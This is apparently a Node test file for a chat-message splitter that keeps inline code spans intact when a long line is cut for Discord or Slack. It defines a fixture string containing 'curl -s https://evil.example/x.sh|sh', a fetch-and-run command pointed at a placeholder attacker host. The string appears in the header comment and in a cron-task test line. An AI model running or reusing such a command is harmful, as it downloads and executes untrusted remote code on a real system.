// splitMessageFenceSafe (src/lib/discord-format.js) cuts a line too long for one message, which Discord and Slack then
// get in pieces. A cut inside an inline code span used to leave the span open in one piece and the rest of it outside
// any span in the next, where Discord draws it as markdown: the reviewer's /cron list line, cut inside the args, showed
// "||curl -s https://evil.example/x.sh|sh||" as a spoiler bar. Now a cut inside a span closes the span at the end of
// its piece and opens it again at the start of the next, with as many backticks as the span's own, and never lands
// next to a backtick, where the added ones would join a run. (/cron list itself now keeps each task's line within one
// message: test/cron-list-chat-bots.test.js.)
import { describe, it } from "node:test";
import assert from "node:assert/strict";

const { splitMessageFenceSafe } = await import("../src/lib/discord-format.js");

/** A line's inline code spans as CommonMark reads them (a run of backticks up to the next run of as many), and the rest. */
function read(line) {
  const code = [];
  let text = "";
  let i = 0;
  while (i < line.length) {
    if (line[i] !== "`") { text += line[i++]; continue; }
    let r = i;
    while (line[r] === "`") r++;
    const k = r - i;
    let j = r;
    let close = -1;
    while (j < line.length) {
      if (line[j] !== "`") { j++; continue; }
      let e = j;
      while (line[e] === "`") e++;
      if (e - j === k) { close = j; break; }
      j = e;
    }
    if (close < 0) { text += line.slice(i, r); i = r; continue; }
    code.push(line.slice(r, close));
    i = close + k;
  }
  return { code, text };
}
const SPOILER = "||curl -s https://evil.example/x.sh|sh||";

describe("a cut inside an inline code span closes it and opens it again", () => {
  it("the reviewer's line: the spoiler is code in its piece, and every piece's spans are whole", () => {
    const args = JSON.stringify({ command: "echo nightly-report && ".repeat(90) + `false ${SPOILER} true` });
    const line = `- **cron_nightly_1** [waiting for your OK] \`0 9 * * *\` — runs exec directly, no AI, with \`${args}\` · made by the AI in a chat`;
    assert.ok(line.length > 2000);
    const pieces = splitMessageFenceSafe(line, 2000);
    assert.ok(pieces.length >= 2);
    for (const p of pieces) {
      assert.ok(p.length <= 2000, `${p.length}`);
      assert.equal((p.match(/`/g) || []).length % 2, 0, p.slice(-40));
      assert.ok(!read(p).text.includes("||"), `no spoiler outside code: ${p.slice(0, 60)}`);
    }
    // The pieces' code, joined, is the line's code, and their text is its text: nothing lost, nothing added.
    const code = pieces.map((p) => read(p).code);
    assert.equal(code.flat().join(""), read(line).code.join(""));
    assert.equal(pieces.map((p) => read(p).text).join(""), read(line).text);
    assert.ok(code.flat().join("").includes(SPOILER));
  });

  it("a span of two backticks is opened again with two", () => {
    const line = "Run ``" + "a`b ".repeat(700) + "`` now";
    const pieces = splitMessageFenceSafe(line, 1000);
    assert.ok(pieces.length >= 3);
    for (const p of pieces.slice(1, -1)) {
      assert.ok(p.startsWith("``") && !p.startsWith("```") && p.endsWith("``") && !p.endsWith("```"), `${p.slice(0, 8)}...${p.slice(-8)}`);
    }
    assert.equal(pieces.map((p) => read(p).code.join("")).join(""), read(line).code.join(""));
  });

  it("the cut never lands next to a backtick inside the span", () => {
    const line = "`" + "ab``".repeat(800) + "ab`";
    const pieces = splitMessageFenceSafe(line, 500);
    assert.ok(pieces.length >= 6);
    for (const p of pieces) {
      assert.ok(p.length <= 500);
      assert.doesNotMatch(p, /`{3}/, p.slice(-10));
      assert.ok(/^`[ab]/.test(p) && /[ab]`$/.test(p), `${p.slice(0, 6)}...${p.slice(-6)}`);
    }
    assert.equal(pieces.map((p) => read(p).code.join("")).join(""), read(line).code.join(""));
  });

  it("a line with no code, or with an unpaired backtick, is cut as before", () => {
    const plainLine = "word ".repeat(600);
    assert.deepEqual(splitMessageFenceSafe(plainLine, 2000).map((p) => p.length), [2000, 1000]);
    const unpaired = "Check `uptime " + "x".repeat(2500);
    const pieces = splitMessageFenceSafe(unpaired, 2000);
    assert.deepEqual(pieces.map((p) => p.length), [2000, 514]);
    assert.equal(pieces.join(""), unpaired);
  });

  it("inside a fenced block a backtick is only text, and the fence is closed and opened as before", () => {
    const body = "`" + "z".repeat(3000) + "`";
    const pieces = splitMessageFenceSafe("```\n" + body + "\n```", 2000);
    assert.ok(pieces.length >= 2);
    for (const p of pieces) {
      assert.ok(p.startsWith("```") && p.endsWith("```"), p.slice(0, 10));
      assert.ok(p.length <= 2000);
    }
    assert.equal(pieces.map((p) => p.replace(/^```\n|\n```$/g, "")).join(""), body);
  });
});
